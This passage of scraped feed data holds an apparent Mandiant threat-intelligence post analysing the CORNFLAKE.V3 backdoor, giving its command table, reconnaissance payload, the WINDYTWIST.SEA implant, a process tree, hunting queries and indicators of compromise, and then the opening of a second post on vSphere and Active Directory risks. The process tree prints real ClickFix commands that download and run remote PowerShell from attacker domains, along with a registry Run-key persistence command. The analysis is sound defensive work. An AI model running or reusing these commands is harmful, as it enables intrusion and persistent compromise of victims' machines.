directory within the user's </span><code style=\"vertical-align: baseline;\">%APPDATA%</code><span style=\"vertical-align: baseline;\"> folder. Subsequently, </span><code style=\"vertical-align: baseline;\">rundll32.exe</code><span style=\"vertical-align: baseline;\"> is invoked to execute the downloaded file.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">JS</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">This decrypted content is saved as a </span><code style=\"vertical-align: baseline;\">&lt;rand_8_char&gt;.jpg</code><span style=\"vertical-align: baseline;\"> file in a temporary directory within the user's </span><code style=\"vertical-align: baseline;\">%APPDATA%</code><span style=\"vertical-align: baseline;\"> folder. The script attempts to check if </span><code style=\"vertical-align: baseline;\">Node.js</code><span style=\"vertical-align: baseline;\"> is installed. If </span><code style=\"vertical-align: baseline;\">Node.js</code><span style=\"vertical-align: baseline;\"> is not found or fails to install from a hardcoded URL (</span><code style=\"vertical-align: baseline;\">http://nodejs[.]org/dist/v21.7.3/node-v21.7.3-win-x64.zip</code><span style=\"vertical-align: baseline;\">), an error message is printed. If </span><code style=\"vertical-align: baseline;\">Node.js</code><span style=\"vertical-align: baseline;\"> is available, the downloaded JavaScript (</span><code style=\"vertical-align: baseline;\">.jpg</code><span style=\"vertical-align: baseline;\">) file is executed using </span><code style=\"vertical-align: baseline;\">node.exe</code><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">3</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">CMD</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">This decrypted data is executed as a provided command string via </span><code style=\"vertical-align: baseline;\">cmd.exe</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">powershell.exe</code><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">4</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ACTIVE</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">This command reports the </span><code style=\"vertical-align: baseline;\">active_cnt</code><span style=\"vertical-align: baseline;\"> (stored in the </span><code style=\"vertical-align: baseline;\">$qRunq</code><span style=\"vertical-align: baseline;\"> global variable) to the C2 server. This likely serves as a heartbeat or activity metric for the implant.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">5</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">AUTORUN</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The malware attempts to establish persistence by adding a registry entry in </span><code style=\"vertical-align: baseline;\">HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code><span style=\"vertical-align: baseline;\"> that points to the script's </span><code style=\"vertical-align: baseline;\">PHP</code><span style=\"vertical-align: baseline;\"> binary and its own path.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">6</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">OFF</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">This command directly calls </span><code style=\"vertical-align: baseline;\">exit(0)</code><span style=\"vertical-align: baseline;\">, which terminates the PHP script's execution.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\"> </td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">OTHER</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">If none of the specific commands match, the received data is saved as a </span><code style=\"vertical-align: baseline;\">.txt</code><span style=\"vertical-align: baseline;\"> file in a temporary directory within the user's </span><code style=\"vertical-align: baseline;\">%APPDATA%</code><span style=\"vertical-align: baseline;\"> folder.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div style=\"color: #5f6368; overflow: auto hidden; width: 100%; text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 3: CORNFLAKE.V3 PHP variant supported payloads</span></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The Javascript payload execution functionality was retained by implementing the download of the Node.js runtime environment inside the </span><code style=\"vertical-align: baseline;\">JS</code><span style=\"vertical-align: baseline;\"> command. Other notable changes include the change of the </span><code style=\"vertical-align: baseline;\">DLL</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">JS</code><span style=\"vertical-align: baseline;\"> payload file extensions into </span><code style=\"vertical-align: baseline;\">.png</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">.jpg</code><span style=\"vertical-align: baseline;\"> to evade detection and the addition of the </span><code style=\"vertical-align: baseline;\">ACTIVE</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">AUTORUN</code><span style=\"vertical-align: baseline;\"> commands. However, the main functionality of the backdoor remains unchanged despite the transition from Node.js to PHP.</span></p>\n<p><span style=\"vertical-align: baseline;\">These changes suggest an ongoing effort by the threat actor to refine their malware against evolving security measures.</span></p>\n<h3 style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Executed Payloads</span></h3>\n<h4><span style=\"vertical-align: baseline;\">Active Directory Reconnaissance</span></h4>\n<p><span style=\"vertical-align: baseline;\">A </span><span style=\"vertical-align: baseline;\">cmd.exe</span><span style=\"vertical-align: baseline;\"> reconnaissance payload similar to the one encountered in the Node.js variant </span><span style=\"vertical-align: baseline;\">was received from the C2 server and executed. The script checks if the machine is part of an Active Directory domain and collects the following information using powershell:</span></p>\n<h5><span style=\"vertical-align: baseline;\">Domain Joined</span></h5>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Total count of computer accounts in AD.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Domain trust relationships.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">List of all Domain Controllers.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Members of the \"Domain Admins\" group.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">User accounts configured with a Service Principal Name (SPN).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">All local groups and their members</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Current User name, SID, local group memberships and security privileges</span></p>\n</li>\n</ul>\n<h5><span style=\"vertical-align: baseline;\">Not Domain Joined</span></h5>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">All local groups and their members</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Current User name, SID, local group memberships and security privileges</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\"> </span></p>\n<h4><span style=\"vertical-align: baseline;\">WINDYTWIST.SEA Backdoor</span></h4>\n<p><span style=\"vertical-align: baseline;\">Following the interaction with its C2 server, a DLL payload (corresponding to command </span><span style=\"vertical-align: baseline;\">1</span><span style=\"vertical-align: baseline;\">) was received, written to disk as </span><code style=\"vertical-align: baseline;\">C:\\Users\\&lt;User&gt;\\AppData\\Roaming\\Shift194340\\78G0ZrQi.png</code> <span style=\"vertical-align: baseline;\">and executed using </span><code style=\"vertical-align: baseline;\">rundll32</code><span style=\"vertical-align: baseline;\">. This file was a </span><code style=\"vertical-align: baseline;\">WINDYTWIST.SEA</code><span style=\"vertical-align: baseline;\"> backdoor implant configured with the following C2 servers:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>tcp://167.235.235[.]151:443\ntcp://128.140.120[.]188:443\ntcp://177.136.225[.]135:443</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">This implant is a C version of the Java </span><code style=\"vertical-align: baseline;\">WINDYTWIST</code><span style=\"vertical-align: baseline;\"> backdoor, which supports relaying TCP traffic, providing a reverse shell, executing commands, and deleting itself. In previous intrusions, Mandiant observed </span><code style=\"vertical-align: baseline;\">WINDYTWIST.SEA</code><span style=\"vertical-align: baseline;\"> samples attempting to move laterally in the network of the infected machine.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The following process tree was observed during the infection:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>explorer.exe\n    ↳ C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \n\"-c irm dnsmicrosoftds-data[.]com/log/out | clip; &amp; \n([scriptblock]::Create((Get-Clipboard) -join \n(\"\"+[System.Environment]::NewLine)))\"\n       ↳ C:\\WINDOWS\\system32\\clip.exe\n       ↳ C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \n\"-w H -c irm windows-msg-as[.]live/qwV1jxQ\"\n       ↳ C:\\WINDOWS\\system32\\systeminfo.exe\n       ↳ C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\php\\php.exe \"-d extension=zip \n-d extension_dir=ext C:\\Users\\&lt;user&gt;\\AppData\\Roaming\\php\\config.cfg \n1 {CORNFLAKE.V3}\"\n          ↳ cmd.exe /s /c \"powershell -c \n{Multiple PS Commands for Host Reconnaissance}\"\n          ↳ cmd.exe /s /c \"powershell -c \n{Multiple PS Commands for Host Reconnaissance}\"\n          ↳ cmd.exe /s /c \"reg add \nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \n/v \"random_appdata_dirname\" /t REG_SZ /d \"\\\"&lt;php_binary_path&gt;\" \n\\\"&lt;script_path&gt;\"\" /f\"\n          ↳ powershell.exe\n             ↳ C:\\Windows\\System32\\rundll32.exe \n\"{WINDYTWIST.SEA Backdoor}\" start</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Conclusion</span></h3>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">This investigation highlights the collaborative nature of modern cyber threats, where UNC5518 leverages compromised websites and deceptive ClickFix lures to gain initial access. This access is then utilized by other actors like UNC5774, who deploy versatile malware such as the CORNFLAKE.V3 backdoor. The subsequent reconnaissance and credential harvesting activities we observed indicate that the attackers intend to move laterally and expand their foothold in the environment.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">To mitigate malware execution through ClickFix, organizations should disable the Windows Run dialog box where possible. Regular simulation exercises are crucial to counter this and other social engineering tactics. Furthermore, robust logging and monitoring systems are essential for detecting the execution of subsequent payloads, such as those associated with CORNFLAKE.V3.</span></p>\n<h3 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Acknowledgements</span></h3>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Special thanks to Diana Ion, Yash Gupta, Rufus Brown, Mike Hunhoff, Genwei Jiang, Mon Liclican, Preston Lewis, Steve Sedotto, Elvis Miezitis and Rommel Joven for their valuable contributions to this blog post.</span></p>\n<h3 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Detection Through Google Security Operations</span></h3>\n<p><span style=\"vertical-align: baseline;\">For detailed guidance on hunting for this activity using the following queries, and for a forum to engage with our security experts, please visit our companion post on the</span> <a href=\"https://security.googlecloudcommunity.com/community-blog-staging-private-71/a-cereal-offender-analyzing-the-cornflake-v3-backdoor-5682\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Community blog</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant has made the relevant rules available in the Google SecOps Mandiant Frontline Threats curated detections rule set. The activity discussed in the blog post is detected in Google SecOps under the rule names:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Powershell Executing NodeJS</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Powershell Writing To Appdata</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Suspicious Clipboard Interaction</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">NodeJS Reverse Shell Execution</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Download to the Windows Public User Directory via PowerShell</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Run Utility Spawning Suspicious Process</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">WSH Startup Folder LNK Creation</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Trycloudflare Tunnel Network Connections</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">SecOps Hunting Queries</span></h4>\n<p><span style=\"vertical-align: baseline;\">The following UDM queries can be used to identify potential compromises within your environment.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Execution of CORNFLAKE.V3 — Node.js </span></h5>\n<p><span style=\"vertical-align: baseline;\">Search for potential compromise activity where PowerShell is used to launch node.exe from %AppData% path with the -e argument, indicating direct execution of a malicious JavaScript string.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>metadata.event_type = \"PROCESS_LAUNCH\"\nprincipal.process.file.full_path = /powershell\\.exe/ nocase\ntarget.process.file.full_path = /appdata\\\\roaming\\\\.*node\\.exe/ nocase\ntarget.process.command_line = /\"?node\\.exe\"?\\s*-e\\s*\"/ nocase</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h5><span style=\"vertical-align: baseline;\">Execution of CORNFLAKE.V3 — PHP</span></h5>\n<p><span style=\"vertical-align: baseline;\">Search for compromise activity where PowerShell is executing php.exe from %AppData% path. This variant is characterized by the use of the -d argument, executing a PHP script without a .php file extension, and passing the argument 1 to the PHP interpreter, indicating covert execution of malicious PHP code.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>metadata.event_type = \"PROCESS_LAUNCH\"\nprincipal.process.file.full_path = /powershell\\.exe/ nocase\ntarget.process.file.full_path = /appdata\\\\roaming\\\\.*php\\.exe/ nocase\ntarget.process.command_line = /\"?php\\.exe\"?\\s*-d\\s.*1$/ nocase\ntarget.process.command_line != /\\.php\\s*\\s*/ nocase</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h5><span style=\"vertical-align: baseline;\">CORNFLAKE.V3 Child Process Spawns</span></h5>\n<p><span style=\"vertical-align: baseline;\">Search suspicious process activity where cmd.exe or powershell.exe are spawned as child processes from node.exe or php.exe when those executables are located in %AppData%.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>metadata.event_type = \"PROCESS_LAUNCH\"\nprincipal.process.file.full_path = \n/appdata\\\\roaming\\\\.*node\\.exe|appdata\\\\roaming\\\\.*php\\.exe/ nocase \ntarget.process.file.full_path = /powershell\\.exe|cmd\\.exe/ nocase</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h5><span style=\"vertical-align: baseline;\">Suspicious Connections to Node.js/PHP Domains</span></h5>\n<p><span style=\"vertical-align: baseline;\">Search unusual network connections initiated by powershell.exe or mshta.exe to legitimate Node.js (nodejs.org) or PHP (windows.php.net) infrastructure domains.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>metadata.event_type = \"NETWORK_CONNECTION\"\nprincipal.process.file.full_path = /powershell\\.exe|mshta\\.exe/ nocase \ntarget.hostname = /nodejs\\.org|windows\\.php\\.net/ nocase</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Indicators of Compromise (IOCs)</span></h3>\n<p><span style=\"vertical-align: baseline;\">A <a href=\"https://www.virustotal.com/gui/collection/dc4207feb8863f26779d067a40b20d7e80b8d225f54ea16e24dcc7493a70d9b9\" rel=\"noopener\" target=\"_blank\">Google Threat Intelligence (GTI) collection of IOCs</a> is available to registered users</span><span style=\"vertical-align: baseline;\">.</span></p>\n<h4><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Host-Based Artifacts</span></span></h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Artifact</span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Description</span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">SHA-256 Hash</span></strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Users\\&lt;User&gt;\\AppData\\Roaming\\node-v22.11.0-win-x64\\ckw8ua56.log</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Copy of the CORNFLAKE.V3 (Node.js) sample used for persistence</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p>000b24076cae8dbb00b46bb59188a0da5a940e325eaac7d86854006ec071ac5b</p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ChromeUpdater</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Registry run key that executes the CORNFLAKE.V3 (Node.js) sample</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">N/A</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Users\\&lt;User&gt;\\AppData\\Roaming\\php\\config.cfg</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">CORNFLAKE.V3 (PHP) sample</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p>a2d4e8c3094c959e144f46b16b40ed29cc4636b88616615b69979f0a44f9a2d1</p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\iCube</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Registry run key that executes the CORNFLAKE.V3 (PHP) sample</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">N/A</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Users\\&lt;User&gt;\\AppData\\Roaming\\Shift194340\\78G0ZrQi.png</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">WINDYTWIST.SEA backdoor sample dropped by CORNFLAKE.V3 (PHP)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p>14f9fbbf7e82888bdc9c314872bf0509835a464d1f03cd8e1a629d0c4d268b0c</p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4>Network-Based Artifacts</h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">IP Address</span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Description</span></strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">138.199.161[.]141</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">IP address associated with UNC5518 used to distribute CORNFLAKE.V3 (Node.js) malware</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">159.69.3[.]151</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">CORNFLAKE.V3 (Node.js) C2 server associated with UNC5774</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">varying-rentals-calgary-predict.trycloudflare[.]com</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">CORNFLAKE.V3 (PHP) C2 server associated with UNC5774</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">dnsmicrosoftds-data[.]com</code></p>\n<p><code style=\"vertical-align: baseline;\">windows-msg-as[.]live</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Domains associated with UNC5518 used to distribute CORNFLAKE.V3 (PHP) malware</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">167.235.235[.]151</code></p>\n<p><code style=\"vertical-align: baseline;\">128.140.120[.]188</code></p>\n<p><code style=\"vertical-align: baseline;\">177.136.225[.]135</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">WINDYTWIST.SEA backdoor C2 server addresses associated with UNC5774</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>"}
{"source": "Threat Intelligence", "title": "Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration", "link": "https://cloud.google.com/blog/topics/threat-intelligence/vsphere-active-directory-integration-risks/", "published": "Wed, 23 Jul 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Stuart Carrera, Brian Meyer</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Executive Summary</span></h2>\n<p><span style=\"vertical-align: baseline;\">Broadcom's VMware vSphere product continues to be a top choice for private cloud virtualization, underpinning important systems and critical infrastructure. Far from losing its appeal, organizations still rely heavily on vSphere for its stability and control. Mandiant is also observing a clear trend where critical workloads are moving back from public cloud services to these on-premises vSphere environments, often driven by strategies that balance innovation with stability and the desire for more direct operational oversight.</span></p>\n<p><span style=\"vertical-align: baseline;\">The common practice of directly integrating vSphere with Microsoft Active Directory (AD), while simplifying administration tasks, creates an attack path frequently underestimated due to a misunderstanding of the inherent risks presented today. This configuration extends the AD attack surface directly to the hypervisor. From a threat actor's perspective, this integration constitutes a high-value opportunity. It transforms the relatively common task of compromising AD credentials into a potential high value scenario, granting access to the underlying infrastructure hosting the servers and in turn allowing them to gain privileged administrative control over ESXi hosts and vCenter and ultimately seize complete command of the virtualized infrastructure.</span></p>\n<p><span style=\"vertical-align: baseline;\">Ransomware aimed at vSphere infrastructure, including both ESXi hosts and vCenter Server, poses a uniquely severe risk due to its capacity for immediate and widespread infrastructure paralysis. With the end of general support for vSphere 7.x approaching in October 2025—the version Mandiant has observed to be running by a large majority of organizations—the threat of targeted ransomware has become urgent. As recovering from such an attack requires substantial time and resources, proactive defense is paramount. It is therefore critical for organizations to understand the specific threats against these core components and implement effective, unified countermeasures to prevent their compromise, especially before support deadlines 